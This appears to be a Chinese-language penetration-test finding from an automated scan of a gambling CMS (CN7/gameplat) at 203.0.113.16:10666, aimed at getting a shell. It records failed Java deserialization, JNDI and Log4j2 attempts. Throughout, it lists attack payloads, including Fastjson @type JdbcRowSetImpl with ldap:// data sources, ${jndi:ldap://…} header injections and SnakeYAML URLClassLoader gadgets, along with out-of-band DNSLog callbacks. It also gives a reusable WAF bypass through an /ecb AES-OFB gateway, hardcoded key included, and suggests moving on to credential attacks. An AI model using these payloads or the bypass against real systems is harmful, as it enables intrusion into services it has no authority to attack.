# 博彩站群 203.0.113.16:10666 Java 反序列化/JNDI/Log4j2 全否（含 OOB 有效性复核与 /ecb 网关格式）

- **code**: cn7-10666-java-deser-jndi-log4j-all-negative
- **kind**: markdown
- **category**: deserialization
- **component**: CN7/gameplat CMS 5.3.0-RELEASE (Spring Boot + 严格 Jackson + Logback)
- **severity**: high
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.16:10666 实测（DNSLog 自检回连正常）：Fastjson @type、Jackson default-typing(含 ["java.net.Inet4Address","x.<dom>"] 构造型)、Log4j2 ${jndi:}(全头/参/body，明文面 + /ecb WAF 绕过面 + CDN 边缘层 + 全端口)、原生 Java 序列化/Hessian/Burlap/XXE/XStream/SnakeYAML(明文 + /ecb) —— 全部零 DNS 回连；/api 写接口为 @RequestParam 表单绑定、对非 JSON body 亦返 200，无 JSON→对象多态 sink。判据：后端 JSON 解析器为严格 Jackson(拒单引号/无引号键/尾逗号)、且 Spring Boot 默认日志为 Logback → 无 Log4j2。
- **path**: pocs/cn7-10666-java-deser-jndi-log4j-all-negative/poc.md
- **tags**: negative,deserialization,jndi,log4j,fastjson,jackson,spring-boot,ecb,waf-bypass,oob,dnslog,cn7,gameplat
- **created_at**: 2026-10-09T18:49:19.592Z
- **found_by**: vuln-scan

## 描述

CN7/gameplat 系列博彩 CMS(5.3.0-RELEASE, Spring Boot)在 Java 反序列化/JNDI/Log4j2 方向经系统性复核后【全否】，且该否定不依赖 OOB 可证性：根因是严格 Jackson 解析器(非 Fastjson)+ Spring Boot 默认 Logback(无 Log4j2)。另附带关键可复用情报：① /ecb/<hex> 是通向真实后端的 AES-OFB 加密网关(WAF 绕过)，其 POST body 必须是明文 AES-OFB 加密后的【十六进制 ASCII 字符串】；② 该站 /jumpto/img/https://<url> 图片代理的出网在阿里云 ENS/CDN 边缘层而非源站，不能用于证明源站 egress。

## 用法

```
【判据/复用】1) 解析器指纹：对 JSON 端点发 {'x':'y'} 与 {x:y}，被拒(400 服务器繁忙/参数缺失)即严格 Jackson→放弃 Fastjson。2) 若后端 Spring Boot，Log4j2 面直接降权。3) WAF 绕过：GET /ecb/<hex(AES-OFB(path, key=iv=6758725226829023))>；POST body = AES-OFB(明文) 的 hex ASCII 字符串。4) 出网层甄别：/jumpto/img/https://<唯一子域>/ 若回连且响应带 Via: ens-cache*/Eagleid/302→aliyun.com/notfoundx.png，则该出网在阿里云 ENS 边缘(非源站)。
```

## 正文

```
## 结论
https://203.0.113.16:10666 （CN7/gameplat 博彩 CMS 5.3.0-RELEASE，Spring Boot）在 **Java 反序列化 / JNDI / Log4j2 拿 shell** 方向**全否**，非 OOB 假阴性。

## 覆盖矩阵（全部实测否定，DNSLog 零回连）
- Fastjson @type（java.lang.AutoCloseable / java.net.Inet4Address / URL / InetSocketAddress / com.sun.rowset.JdbcRowSetImpl(dataSourceName=ldap://…)）→ 明文面 + /ecb 面 均零回连
- Jackson default-typing 正确数组形态：`["com.sun.rowset.JdbcRowSetImpl",{...}]`、`["java.net.Inet4Address","x.<dom>"]`、`["java.net.InetAddress","x.<dom>"]`、`{"@class":...}`、nested → 零回连（default typing 未开启）
- Log4j2 `${jndi:ldap://…}`：User-Agent/Referer/X-Api-Version/X-Forwarded-For/Origin/tenantCode + body，明文面、/ecb WAF 绕过面、CDN 边缘层（/jumpto/img 的 URL/query/Host/XFF）、全部高位端口 → 零回连
- 原生 Java 序列化(ac ed 00 05) / Hessian2(H\x02\x00) / Burlap / XML-XXE(外部实体) / XStream(com.sun.rowset.JdbcRowSetImpl) / SnakeYAML(!!javax.script.ScriptEngineManager…URLClassLoader) → 明文面 + /ecb 面 均无 sink
- JNDI 直填参数 url/jdbcUrl/dataSource/jndiName → 零回连

## 根因（不依赖 OOB，硬证据）
1. JSON 体解析器为**严格 Jackson**（拒绝 `{'x':'y'}` / `{x:y}` / `{"x":"y",}` / `{"x":NaN}` 等 Fastjson 会宽松接受的畸形体）；前端 bundle 无 fastjson/JSON.parseObject/ysoserial/RuoYi 字样。
2. 后端 = Spring Boot，默认日志实现 **Logback（非 Log4j2）** → Log4j2 JNDI 天然缺失。
3. `/api/*` 写接口普遍 `@RequestParam`(form) 绑定：`/api/tenant/setting/getConfig`、`/api/email/send` 对**完全非 JSON** body（`not-json-at-all`）仍返回 200；`/api/agent/member/addChild` 不读 JSON 里的 username → 无 JSON body → 对象 的多态映射面。JSON 体真正被解析的唯一已知通道是 /ecb 网关。

## OOB 有效性复核（消除假阴性疑虑）
- DNSLog 管线可用：向 dnslog.cn 取域后，本机解析 selfcheck.<dom> 立即回显 → 谁能解析即被记录。
- /jumpto/img/https://<唯一子域>/x.png 确实触发了目标侧外部 DNS 解析，来源 resolver 172.253.x.x（海外公共 DNS），但响应头含 `Via: ens-cache28.hk48`、`Eagleid`、`302 → https://www.aliyun.com/notfoundx.png`（阿里云 ENS/CDN 边缘特征）→ 该出网层是**图片代理边缘，不是 Java 源站**，故不能作为源站 egress 的证明。
- 应用侧邮件/通知端点（/api/email/send 等）对攻击者域名零 DNS 解析，源站 egress 未获正面证明——但如上，否定结论不依赖它。

## 可复用情报
- **/ecb 网关**：`GET /ecb/<hex(AES-OFB(明文路径))>` 直连后端（如 enc("api/config/dial_code") → 200 配置）；`POST /ecb/<hex(path)>` 的 body 必须是「明文 AES-OFB 加密后的**十六进制 ASCII 字符串**」（用原始二进制 unhexlify 形式会 500）。密钥 key=iv=`6758725226829023`(AES-OFB)。明文 `..;/` 被品牌 WAF 403，经 /ecb 可达后端 → 稳定的 WAF 绕过通道。
- `/api/error`、`/api/%zz` 等未授权路径返回 Spring Boot 默认 whitelabel 错误 JSON `{"timestamp":…,"status":404,"error":"Not Found","path":…}`（非 SPA 兜底/非 401），可用于探测真实映射路径并确认 Spring Boot。

## 复用建议（判据）
先做解析器指纹（发 `{'x':'y'}`/`{x:y}`/`{"x":"y",}`/`{"x":NaN}`，Fastjson 宽松接受、严格 Jackson 报错）再决定是否打 Fastjson；确认后端为 Spring Boot 时，Log4j2 面可直接降权（默认 Logback）。本类平台应转向框架层(#2804 类)或配置/凭据面，而非 Java 反序列化。
```
